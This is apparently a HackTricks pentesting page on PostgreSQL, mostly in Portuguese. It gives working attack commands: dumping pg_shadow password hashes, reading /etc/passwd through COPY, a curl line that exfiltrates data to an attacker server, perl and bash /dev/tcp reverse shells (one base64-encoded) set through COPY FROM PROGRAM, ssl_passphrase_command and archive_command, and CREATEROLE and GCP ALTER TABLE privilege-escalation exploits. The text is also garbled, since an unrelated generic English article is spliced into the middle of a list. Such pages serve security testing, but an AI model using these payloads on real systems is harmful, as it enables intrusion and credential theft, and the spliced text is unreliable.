# 5432,5433 - Pentesting Postgresql

![](<../.gitbook/assets/image (9) (1) (2).png>)

\
Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir e automatizar facilmente fluxos de trabalho com as ferramentas comunit√°rias mais avan√ßadas do mundo.\
Acesse hoje mesmo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de ciberseguran√ßa**? Gostaria de ver sua **empresa anunciada no HackTricks**? Ou gostaria de ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **Informa√ß√µes b√°sicas**

O **PostgreSQL** √© um sistema de banco de dados objeto-relacional de c√≥digo aberto que utiliza e estende a linguagem SQL.

**Porta padr√£o:** 5432, e se essa porta j√° estiver em uso, parece que o postgresql usar√° a pr√≥xima porta (provavelmente 5433) que n√£o est√° em uso.
```
PORT     STATE SERVICE
5432/tcp open  pgsql
```
## Conectar e Enumera√ß√£o B√°sica

Para realizar testes de penetra√ß√£o em um servidor PostgreSQL, √© necess√°rio estabelecer uma conex√£o com o banco de dados e realizar uma enumera√ß√£o b√°sica para obter informa√ß√µes sobre o ambiente.

### Conex√£o

Para se conectar a um servidor PostgreSQL, voc√™ pode usar a ferramenta `psql` ou qualquer outra ferramenta de cliente compat√≠vel. A sintaxe b√°sica para se conectar √© a seguinte:

```bash
psql -h <host> -p <port> -U <username> -d <database>
```

Substitua `<host>` pelo endere√ßo IP ou nome do host do servidor PostgreSQL, `<port>` pela porta em que o servidor est√° ouvindo, `<username>` pelo nome de usu√°rio v√°lido e `<database>` pelo nome do banco de dados que deseja acessar.

### Enumera√ß√£o B√°sica

Ap√≥s estabelecer a conex√£o com o servidor PostgreSQL, voc√™ pode realizar uma enumera√ß√£o b√°sica para obter informa√ß√µes sobre o banco de dados. Aqui est√£o alguns comandos √∫teis:

- `\l`: Lista todos os bancos de dados dispon√≠veis.
- `\dt`: Lista todas as tabelas no banco de dados atual.
- `\du`: Lista todos os usu√°rios do banco de dados.
- `\dv`: Lista todas as views no banco de dados atual.
- `\df`: Lista todas as fun√ß√µes no banco de dados atual.
- `\dp`: Lista as permiss√µes de acesso no banco de dados atual.

Esses comandos fornecer√£o informa√ß√µes valiosas sobre a estrutura do banco de dados, tabelas, usu√°rios e permiss√µes de acesso.

Lembre-se de que a enumera√ß√£o b√°sica √© apenas o primeiro passo na realiza√ß√£o de testes de penetra√ß√£o em um servidor PostgreSQL. √â importante explorar ainda mais as vulnerabilidades identificadas e realizar testes adicionais para garantir a seguran√ßa do sistema.
```bash
psql -U <myuser> # Open psql console with user
psql -h <host> -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
```

```sql
psql -h localhost -d <database_name> -U <User> #Password will be prompted
\list # List databases
\c <database> # use the database
\d # List tables
\du+ # Get users roles

# Get current user
Select user;

# List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

# Get languages
SELECT lanname,lanacl FROM pg_language;

# Show installed extensions
SHOW rds.extensions;
SELECT * FROM pg_extension;

# Get history of commands executed
\s
```
{% hint style="warning" %}
Se ao executar **`\list`** voc√™ encontrar um banco de dados chamado **`rdsadmin`**, voc√™ saber√° que est√° dentro de um banco de dados **PostgreSQL da AWS**.
{% endhint %}

Para obter mais informa√ß√µes sobre **como abusar de um banco de dados PostgreSQL**, consulte:

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/" %}
[postgresql-injection](../pentesting-web/sql-injection/postgresql-injection/)
{% endcontent-ref %}

## Enumera√ß√£o Autom√°tica
```
msf> use auxiliary/scanner/postgres/postgres_version
msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection
```
### [**For√ßa bruta**](../generic-methodologies-and-resources/brute-force.md#postgresql)

### **Varredura de portas**

De acordo com [**esta pesquisa**](https://www.exploit-db.com/papers/13084), quando uma tentativa de conex√£o falha, o `dblink` lan√ßa uma exce√ß√£o `sqlclient_unable_to_establish_sqlconnection` incluindo uma explica√ß√£o do erro. Exemplos desses detalhes est√£o listados abaixo.
```sql
SELECT * FROM dblink_connect('host=1.2.3.4
port=5678
user=name
password=secret
dbname=abc
connect_timeout=10');
```
* O host est√° inativo

`DETALHE: n√£o foi poss√≠vel conectar ao servidor: Nenhuma rota para o host. O servidor est√° em execu√ß√£o no host "1.2.3.4" e aceitando conex√µes TCP/IP na porta 5678?`

* A porta est√° fechada
```
DETAIL:  could not connect to server: Connection refused Is  the  server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
* A porta est√° aberta
```
DETAIL:  server closed the connection unexpectedly This  probably  means
the server terminated abnormally before or while processing the request
```
# Pentesting PostgreSQL

## Introduction

PostgreSQL is an open-source relational database management system (RDBMS) that is widely used in web applications. As a pentester, it is important to understand how to test the security of PostgreSQL installations to identify potential vulnerabilities and weaknesses.

## Enumeration

### Version Detection

To begin the pentesting process, it is crucial to identify the version of PostgreSQL running on the target system. This information can be obtained by sending a simple query to the server:

```sql
SELECT version();
```

### User Enumeration

Once the version is known, the next step is to enumerate the users present in the database. This can be achieved by querying the `pg_user` table:

```sql
SELECT usename FROM pg_user;
```

### Database Enumeration

After enumerating the users, the next step is to enumerate the databases present on the server. This can be done by querying the `pg_database` table:

```sql
SELECT datname FROM pg_database;
```

## Exploitation

### Default Credentials

One common vulnerability in PostgreSQL installations is the use of default or weak credentials. It is important to test for default usernames and passwords such as `postgres:postgres` or `admin:admin`.

### SQL Injection

SQL injection is a common vulnerability that can be exploited in PostgreSQL. It occurs when user-supplied input is not properly sanitized and is directly concatenated into SQL queries. By injecting malicious SQL code, an attacker can manipulate the query and potentially gain unauthorized access to the database.

### Privilege Escalation

If a low-privileged user account is compromised, it is important to test for privilege escalation vulnerabilities. This involves identifying misconfigurations or vulnerabilities that could allow an attacker to elevate their privileges and gain administrative access to the database.

## Conclusion

Pentesting PostgreSQL installations is an essential part of ensuring the security of web applications. By understanding the enumeration and exploitation techniques outlined in this guide, pentesters can effectively identify and mitigate vulnerabilities in PostgreSQL deployments.
```
DETAIL:  FATAL:  password authentication failed for user "name"
```
* A porta est√° aberta ou filtrada
```
DETAIL:  could not connect to server: Connection timed out Is the server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
Infelizmente, n√£o parece haver uma maneira de obter os detalhes da exce√ß√£o dentro de uma fun√ß√£o PL/pgSQL. Mas voc√™ pode obter os detalhes se puder se conectar diretamente ao servidor PostgreSQL. Se n√£o for poss√≠vel obter nomes de usu√°rio e senhas diretamente das tabelas do sistema, o ataque de lista de palavras descrito na se√ß√£o anterior pode ser bem-sucedido.

## Enumera√ß√£o de Privil√©gios

### Fun√ß√µes

| Tipos de Fun√ß√£o |                                                                                                                                                      |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| rolsuper       | A fun√ß√£o tem privil√©gios de superusu√°rio                                                                                                                        |
| rolinherit     | A fun√ß√£o herda automaticamente os privil√©gios das fun√ß√µes das quais √© membro                                                                                    |
| rolcreaterole  | A fun√ß√£o pode criar mais fun√ß√µes                                                                                                                           |
| rolcreatedb    | A fun√ß√£o pode criar bancos de dados                                                                                                                            |
| rolcanlogin    | A fun√ß√£o pode fazer login. Ou seja, essa fun√ß√£o pode ser usada como identificador de autoriza√ß√£o de sess√£o inicial                                                     |
| rolreplication | A fun√ß√£o √© uma fun√ß√£o de replica√ß√£o. Uma fun√ß√£o de replica√ß√£o pode iniciar conex√µes de replica√ß√£o e criar e excluir slots de replica√ß√£o.                           |
| rolconnlimit   | Para fun√ß√µes que podem fazer login, isso define o n√∫mero m√°ximo de conex√µes simult√¢neas que essa fun√ß√£o pode fazer. -1 significa sem limite.                                 |
| rolpassword    | N√£o √© a senha (sempre lida como `********`)                                                                                                        |
| rolvaliduntil  | Tempo de expira√ß√£o da senha (usado apenas para autentica√ß√£o de senha); nulo se n√£o houver expira√ß√£o                                                                  |
| rolbypassrls   | A fun√ß√£o ignora todas as pol√≠ticas de seguran√ßa em n√≠vel de linha, consulte [Se√ß√£o 5.8](https://www.postgresql.org/docs/current/ddl-rowsecurity.html) para obter mais informa√ß√µes. |
| rolconfig      | Valores padr√£o espec√≠ficos da fun√ß√£o para vari√°veis de configura√ß√£o em tempo de execu√ß√£o                                                                                          |
| oid            | ID da fun√ß√£o                                                                                                                                           |

#### Grupos Interessantes

* Se voc√™ for membro de **`pg_execute_server_program`**, voc√™ pode **executar** programas
* Se voc√™ for membro de **`pg_read_server_files`**, voc√™ pode **ler** arquivos
* Se voc√™ for membro de **`pg_write_server_files`**, voc√™ pode **escrever** arquivos

{% hint style="info" %}
Observe que no Postgres um **usu√°rio**, um **grupo** e uma **fun√ß√£o** s√£o a **mesma coisa**. Isso depende apenas de **como voc√™ os usa** e se voc√™ **permite que eles fa√ßam login**.
{% endhint %}
```sql
# Get users roles
\du

#Get users roles & groups
# r.rolpassword
# r.rolconfig,
SELECT
r.rolname,
r.rolsuper,
r.rolinherit,
r.rolcreaterole,
r.rolcreatedb,
r.rolcanlogin,
r.rolbypassrls,
r.rolconnlimit,
r.rolvaliduntil,
r.oid,
ARRAY(SELECT b.rolname
FROM pg_catalog.pg_auth_members m
JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
WHERE m.member = r.oid) as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1;

# Check if current user is superiser
## If response is "on" then true, if "off" then false
SELECT current_setting('is_superuser');

# Try to grant access to groups
## For doing this you need to be admin on the role, superadmin or have CREATEROLE role (see next section)
GRANT pg_execute_server_program TO "username";
GRANT pg_read_server_files TO "username";
GRANT pg_write_server_files TO "username";
## You will probably get this error:
## Cannot GRANT on the "pg_write_server_files" role without being a member of the role.

# Create new role (user) as member of a role (group)
CREATE ROLE u LOGIN PASSWORD 'lriohfugwebfdwrr' IN GROUP pg_read_server_files;
## Common error
## Cannot GRANT on the "pg_read_server_files" role without being a member of the role.
```
### Tabelas

PostgreSQL databases consist of tables, which are used to organize and store data. Each table is made up of columns and rows. Columns define the type of data that can be stored in a table, while rows represent individual records or entries.

As a penetration tester, it is important to understand the structure and content of the tables in a PostgreSQL database. This knowledge can help you identify potential vulnerabilities and weaknesses that can be exploited during a penetration test.

To gather information about the tables in a PostgreSQL database, you can use various techniques and tools. One common approach is to query the system catalog tables, such as `pg_tables` and `pg_class`, which store metadata about the tables in the database.

Here are some techniques you can use to gather information about tables during a PostgreSQL penetration test:

1. **Enumerating Tables**: Use SQL queries to enumerate the tables in the database. For example, you can use the following query to list all the tables in the current database:

   ```sql
   SELECT table_name FROM information_schema.tables WHERE table_schema = 'public';
   ```

2. **Extracting Table Data**: Use SQL queries to extract data from specific tables. For example, you can use the following query to retrieve all the data from a table named `users`:

   ```sql
   SELECT * FROM users;
   ```

3. **Analyzing Table Structure**: Use SQL queries to analyze the structure of a table, including the column names, data types, and constraints. For example, you can use the following query to retrieve the column names and data types of a table named `users`:

   ```sql
   SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'users';
   ```

By using these techniques, you can gain valuable insights into the tables in a PostgreSQL database and identify potential security issues that can be exploited during a penetration test.
```sql
# Get owners of tables
select schemaname,tablename,tableowner from pg_tables;
## Get tables where user is owner
select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';

# Get your permissions over tables
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants;

#Check users privileges over a table (pg_shadow on this example)
## If nothing, you don't have any permission
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants WHERE table_name='pg_shadow';
```
### Fun√ß√µes

Functions in PostgreSQL are named blocks of code that can be executed by calling their name. They are used to perform specific tasks and can accept parameters and return values. Functions can be created using the `CREATE FUNCTION` statement and can be written in various programming languages, including SQL, PL/pgSQL, and others.

#### Creating Functions

To create a function in PostgreSQL, you need to specify the function name, input parameters (if any), return type, and the code block that defines the function's behavior. Here is the basic syntax for creating a function:

```sql
CREATE FUNCTION function_name (parameter1 datatype, parameter2 datatype, ...)
  RETURNS return_type
  LANGUAGE language_name
AS
$$
  -- Function code goes here
$$;
```

Let's break down the syntax:

- `CREATE FUNCTION`: This is the statement used to create a function.
- `function_name`: The name of the function you want to create.
- `(parameter1 datatype, parameter2 datatype, ...)`: The input parameters for the function, if any. Each parameter is specified with a name and a data type.
- `RETURNS return_type`: The return type of the function. This specifies the data type of the value that the function will return.
- `LANGUAGE language_name`: The programming language in which the function is written. PostgreSQL supports multiple languages, including SQL, PL/pgSQL, and others.
- `AS`: This keyword is used to indicate the start of the function's code block.
- `$$`: This is the delimiter used to enclose the function's code block. The code block is written between the two delimiters.

#### Example

Here is an example of a simple function that calculates the square of a given number:

```sql
CREATE FUNCTION square(num integer)
  RETURNS integer
  LANGUAGE SQL
AS
$$
  SELECT num * num;
$$;
```

In this example, the function is named `square` and takes an integer parameter `num`. It returns an integer value, which is the square of the input number. The function is written in SQL language and the code block simply performs the multiplication operation.

#### Calling Functions

Once a function is created, you can call it by using its name and passing the required arguments. Here is the syntax for calling a function:

```sql
SELECT function_name(argument1, argument2, ...)
```

For example, to call the `square` function we created earlier and calculate the square of the number 5, you would use the following query:

```sql
SELECT square(5);
```

This would return the result `25`, which is the square of 5.

Functions are a powerful feature in PostgreSQL that allow you to encapsulate complex logic and reuse it in your queries. They can greatly enhance the functionality and maintainability of your database applications.
```sql
# Interesting functions are inside pg_catalog
\df * #Get all
\df *pg_ls* #Get by substring
\df+ pg_read_binary_file #Check who has access

# Get all functions of a schema
\df pg_catalog.*

# Get all functions of a schema (pg_catalog in this case)
SELECT routines.routine_name, parameters.data_type, parameters.ordinal_position
FROM information_schema.routines
LEFT JOIN information_schema.parameters ON routines.specific_name=parameters.specific_name
WHERE routines.specific_schema='pg_catalog'
ORDER BY routines.routine_name, parameters.ordinal_position;

# Another aparent option
SELECT * FROM pg_proc;
```
## A√ß√µes no sistema de arquivos

### Ler diret√≥rios e arquivos

A partir deste [**commit**](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a), membros do grupo definido **`DEFAULT_ROLE_READ_SERVER_FILES`** (chamado **`pg_read_server_files`**) e **super usu√°rios** podem usar o m√©todo **`COPY`** em qualquer caminho (verifique `convert_and_check_filename` em `genfile.c`):
```sql
# Read file
CREATE TABLE demo(t text);
COPY demo from '/etc/passwd';
SELECT * FROM demo;
```
{% hint style="warning" %}
Lembre-se de que, se voc√™ n√£o √© um super usu√°rio, mas tem permiss√µes **CREATEROLE**, voc√™ pode **tornar-se membro desse grupo:**
```sql
GRANT pg_read_server_files TO username;
```
[**Mais informa√ß√µes.**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

Existem **outras fun√ß√µes do postgres** que podem ser usadas para **ler arquivos ou listar um diret√≥rio**. Apenas **superusu√°rios** e **usu√°rios com permiss√µes expl√≠citas** podem us√°-las:
```sql
# Before executing these function go to the postgres DB (not in the template1)
\c postgres
## If you don't do this, you might get "permission denied" error even if you have permission

select * from pg_ls_dir('/tmp');
select * from pg_read_file('/etc/passwd', 0, 1000000);
select * from pg_read_binary_file('/etc/passwd');

# Check who has permissions
\df+ pg_ls_dir
\df+ pg_read_file
\df+ pg_read_binary_file

# Try to grant permissions
GRANT EXECUTE ON function pg_catalog.pg_ls_dir(text) TO username;
# By default you can only access files in the datadirectory
SHOW data_directory;
# But if you are a member of the group pg_read_server_files
# You can access any file, anywhere
GRANT pg_read_server_files TO username;
# Check CREATEROLE privilege escalation
```
Voc√™ pode encontrar **mais fun√ß√µes** em [https://www.postgresql.org/docs/current/functions-admin.html](https://www.postgresql.org/docs/current/functions-admin.html)

### Escrita Simples de Arquivo

Apenas **super usu√°rios** e membros de **`pg_write_server_files`** podem usar o comando copy para escrever arquivos.

{% code overflow="wrap" %}
```sql
copy (select convert_from(decode('<ENCODED_PAYLOAD>','base64'),'utf-8')) to '/just/a/path.exec';
```
{% endcode %}

{% hint style="warning" %}
Lembre-se de que se voc√™ n√£o for um super usu√°rio, mas tiver permiss√µes **`CREATEROLE`**, voc√™ pode **tornar-se membro desse grupo:**
```sql
GRANT pg_write_server_files TO username;
```
[**Mais informa√ß√µes.**](pentesting-postgresql.md#escalada-de-privil√©gios-com-createrole)
{% endhint %}

Lembre-se de que o COPY n√£o pode lidar com caracteres de nova linha, portanto, mesmo se voc√™ estiver usando uma carga √∫til em base64, **voc√™ precisa enviar em uma linha √∫nica**.\
Uma limita√ß√£o muito importante dessa t√©cnica √© que **`copy` n√£o pode ser usado para gravar arquivos bin√°rios, pois modifica alguns valores bin√°rios**.

### **Upload de arquivos bin√°rios**

No entanto, existem **outras t√©cnicas para fazer upload de arquivos bin√°rios grandes:**

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md" %}
[big-binary-files-upload-postgresql.md](../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md)
{% endcontent-ref %}

## <img src="../.gitbook/assets/i3.png" alt="" data-size="original">

**Dica de bug bounty**: **inscreva-se** no **Intigriti**, uma plataforma premium de **bug bounty criada por hackers, para hackers**! Junte-se a n√≥s em [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) hoje mesmo e comece a ganhar recompensas de at√© **$100.000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## RCE

### **RCE para programa**

Desde a [vers√£o 9.3](https://www.postgresql.org/docs/9.3/release-9-3.html), apenas **super usu√°rios** e membros do grupo **`pg_execute_server_program`** podem usar o copy para RCE (exemplo com exfiltra√ß√£o:
```sql
'; copy (SELECT '') to program 'curl http://YOUR-SERVER?f=`ls -l|base64`'-- -
```
Exemplo de execu√ß√£o:
```bash
#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

#Reverse shell
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```
{% hint style="warning" %}
Lembre-se de que se voc√™ n√£o for um super usu√°rio, mas tiver permiss√µes **`CREATEROLE`**, voc√™ pode **tornar-se membro desse grupo:**
```sql
GRANT pg_execute_server_program TO username;
```
[**Mais informa√ß√µes.**](pentesting-postgresql.md#escalada-de-privil√©gios-com-createrole)
{% endhint %}

Ou use o m√≥dulo `multi/postgres/postgres_copy_from_program_cmd_exec` do **metasploit**.\
Mais informa√ß√µes sobre essa vulnerabilidade [**aqui**](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5). Embora relatado como CVE-2019-9193, o Postges declarou que isso era um [recurso e n√£o seria corrigido](https://www.postgresql.org/about/news/cve-2019-9193-not-a-security-vulnerability-1935/).

### RCE com Linguagens do PostgreSQL

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md" %}
[rce-with-postgresql-languages.md](../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md)
{% endcontent-ref %}

### RCE com Extens√µes do PostgreSQL

Depois de **aprender** do post anterior **como fazer upload de arquivos bin√°rios**, voc√™ pode tentar obter **RCE fazendo upload de uma extens√£o do postgresql e carregando-a**.

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md" %}
[rce-with-postgresql-extensions.md](../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md)
{% endcontent-ref %}

### RCE com arquivo de configura√ß√£o do PostgreSQL

O **arquivo de configura√ß√£o** do postgresql √© **grav√°vel** pelo **usu√°rio postgres**, que √© o que executa o banco de dados, ent√£o como **superusu√°rio** voc√™ pode gravar arquivos no sistema de arquivos e, portanto, pode **sobrescrever esse arquivo**.

![](<../.gitbook/assets/image (303).png>)

#### **RCE com ssl\_passphrase\_command**

O arquivo de configura√ß√£o possui alguns atributos interessantes que podem levar a RCE:

* `ssl_key_file = '/etc/ssl/private/ssl-cert-snakeoil.key'` Caminho para a chave privada do banco de dados
* `ssl_passphrase_command = ''` Se o arquivo privado estiver protegido por senha (criptografado), o postgresql ir√° **executar o comando indicado nesse atributo**.
* `ssl_passphrase_command_supports_reload = off` **Se** esse atributo estiver **ligado**, o **comando** executado se a chave estiver protegida por senha **ser√° executado** quando `pg_reload_conf()` for **executado**.

Ent√£o, um invasor precisar√°:

1. **Extrair a chave privada** do servidor
2. **Criptografar** a chave privada baixada:
1. `rsa -aes256 -in downloaded-ssl-cert-snakeoil.key -out ssl-cert-snakeoil.key`
3. **Sobrescrever**
4. **Extrair** a **configura√ß√£o** atual do postgresql
5. **Sobrescrever** a **configura√ß√£o** com a configura√ß√£o dos atributos mencionados:
1. `ssl_passphrase_command = 'bash -c "bash -i >& /dev/tcp/127.0.0.1/8111 0>&1"'`
2. `ssl_passphrase_command_supports_reload = on`
6. Executar `pg_reload_conf()`

Ao testar isso, notei que isso s√≥ funcionar√° se o **arquivo da chave privada tiver permiss√µes 640**, for **propriedade do root** e do **grupo ssl-cert ou postgres** (para que o usu√°rio postgres possa l√™-lo) e estiver localizado em _/var/lib/postgresql/12/main_.

**Mais** [**informa√ß√µes sobre essa t√©cnica aqui**](https://pulsesecurity.co.nz/articles/postgres-sqli)**.**

#### **RCE com archive\_command**

Outro atributo no arquivo de configura√ß√£o que √© explor√°vel √© `archive_command`.

Para isso funcionar, a configura√ß√£o `archive_mode` deve ser `'on'` ou `'always'`. Se isso for verdade, ent√£o podemos sobrescrever o comando em `archive_command` e for√ß√°-lo a ser executado por meio das opera√ß√µes de WAL (write-ahead logging).

Os passos gerais s√£o:

1. Verificar se o modo de arquivo est√° habilitado: `SELECT current_setting('archive_mode')`
2. Sobrescrever `archive_command` com o payload. Por exemplo, um shell reverso: `archive_command = 'echo "dXNlIFNvY2tldDskaT0iMTAuMC4wLjEiOyRwPTQyNDI7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307" | base64 --decode | perl'`
3. Recarregar a configura√ß√£o: `SELECT pg_reload_conf()`
4. For√ßar a opera√ß√£o do WAL a ser executada, o que chamar√° o comando de arquivo: `SELECT pg_switch_wal()` ou `SELECT pg_switch_xlog()` para algumas vers√µes do Postgres

**Mais** [**informa√ß√µes sobre essa configura√ß√£o e sobre WAL aqui**](https://medium.com/dont-code-me-on-that/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)**.**

## **Eleva√ß√£o de Privil√©gios no Postgres**

### Eleva√ß√£o de Privil√©gios CREATEROLE

#### **Conceder**

De acordo com a [**documenta√ß√£o**](https://www.postgresql.org/docs/13/sql-grant.html): _Fun√ß√µes que t√™m o privil√©gio **`CREATEROLE`** podem **conceder ou revogar a associa√ß√£o em qualquer fun√ß√£o** que **n√£o seja** um **superusu√°rio**._

Portanto, se voc√™ tiver permiss√£o **`CREATEROLE`**, poder√° conceder a si mesmo acesso a outras **fun√ß√µes** (que n√£o sejam superusu√°rio) que podem permitir a leitura e grava√ß√£o de arquivos e a execu√ß√£o de comandos:
```sql
# Access to execute commands
GRANT pg_execute_server_program TO username;
# Access to read files
GRANT pg_read_server_files TO username;
# Access to write files
GRANT pg_write_server_files TO username;
```
#### Modificar Senha

Usu√°rios com essa fun√ß√£o tamb√©m podem **alterar** as **senhas** de outros **n√£o-superusu√°rios**:
```sql
#Change password
ALTER USER user_name WITH PASSWORD 'new_password';
```
#### Privesc para SUPERUSER

√â bastante comum encontrar que **usu√°rios locais podem fazer login no PostgreSQL sem fornecer nenhuma senha**. Portanto, uma vez que voc√™ tenha obtido **permiss√µes para executar c√≥digo**, voc√™ pode abusar dessas permiss√µes para obter a fun√ß√£o de **`SUPERUSER`**:
```sql
COPY (select '') to PROGRAM 'psql -U <super_user> -c "ALTER USER <your_username> WITH SUPERUSER;"';
```
{% hint style="info" %}
Isso geralmente √© poss√≠vel devido √†s seguintes linhas no arquivo **`pg_hba.conf`**:
```bash
# "local" is for Unix domain socket connections only
local   all             all                                     trust
# IPv4 local connections:
host    all             all             127.0.0.1/32            trust
# IPv6 local connections:
host    all             all             ::1/128                 trust
```
{% endhint %}

### **ALTER TABLE privesc**

Neste **writeup**, √© explicado como foi poss√≠vel realizar uma **eleva√ß√£o de privil√©gios** no Postgres GCP abusando do privil√©gio ALTER TABLE concedido ao usu√°rio.

Quando voc√™ tenta **atribuir a propriedade de uma tabela a outro usu√°rio**, voc√™ deveria receber um **erro** impedindo isso, mas aparentemente o GCP deu essa **op√ß√£o ao usu√°rio postgres n√£o-superuser** no GCP:

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Unindo essa ideia ao fato de que quando os comandos **INSERT/UPDATE/ANALYZE** s√£o executados em uma **tabela com uma fun√ß√£o de √≠ndice**, a **fun√ß√£o** √© **chamada** como parte do comando com as **permiss√µes do propriet√°rio da tabela**. √â poss√≠vel criar um √≠ndice com uma fun√ß√£o e atribuir permiss√µes de propriet√°rio a um **super usu√°rio** sobre essa tabela e, em seguida, executar ANALYZE na tabela com a fun√ß√£o maliciosa que ser√° capaz de executar comandos porque est√° usando as permiss√µes do propriet√°rio.
```c
GetUserIdAndSecContext(&save_userid, &save_sec_context);
SetUserIdAndSecContext(onerel->rd_rel->relowner,
save_sec_context | SECURITY_RESTRICTED_OPERATION);
```
#### Explora√ß√£o

1. Crie uma nova tabela.
2. Insira algum conte√∫do falso na tabela, para que a fun√ß√£o de √≠ndice tenha algo para trabalhar.
3. Crie uma fun√ß√£o de √≠ndice maliciosa (com nossa carga √∫til de execu√ß√£o de c√≥digo) na tabela.
4. ALTERE o propriet√°rio da tabela para cloudsqladmin, a fun√ß√£o superusu√°rio do GCP, usada apenas pelo Cloud SQL para manter e gerenciar o banco de dados.
5. ANALISE a tabela, for√ßando o mecanismo do PostgreSQL a alternar o contexto do usu√°rio para o propriet√°rio da tabela (cloudsqladmin) e chamar a fun√ß√£o de √≠ndice maliciosa com as permiss√µes do cloudsqladmin, resultando na execu√ß√£o do nosso comando shell, para o qual n√£o t√≠nhamos permiss√£o para executar anteriormente.

No PostgreSQL, esse fluxo se parece com isso:
```sql
CREATE TABLE temp_table (data text);
CREATE TABLE shell_commands_results (data text);

INSERT INTO temp_table VALUES ('dummy content');

/* PostgreSQL does not allow creating a VOLATILE index function, so first we create IMMUTABLE index function */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql IMMUTABLE AS 'select ''nothing'';';

CREATE INDEX index_malicious ON public.temp_table (suid_function(data));

ALTER TABLE temp_table OWNER TO cloudsqladmin;

/* Replace the function with VOLATILE index function to bypass the PostgreSQL restriction */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql VOLATILE AS 'COPY public.shell_commands_results (data) FROM PROGRAM ''/usr/bin/id''; select ''test'';';

ANALYZE public.temp_table;
```
Depois de executar a consulta de explora√ß√£o SQL, a tabela `shell_commands_results` cont√©m a sa√≠da do c√≥digo executado:
```
uid=2345(postgres) gid=2345(postgres) groups=2345(postgres)
```
### Login Local

Algumas inst√¢ncias mal configuradas do postgresql podem permitir o login de qualquer usu√°rio local, √© poss√≠vel fazer login local a partir de 127.0.0.1 usando a fun√ß√£o **`dblink`**:
```sql
\du * # Get Users
\l    # Get databases
SELECT * FROM dblink('host=127.0.0.1
port=5432
user=someuser
password=supersecret
dbname=somedb',
'Select usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
{% hint style="warning" %}
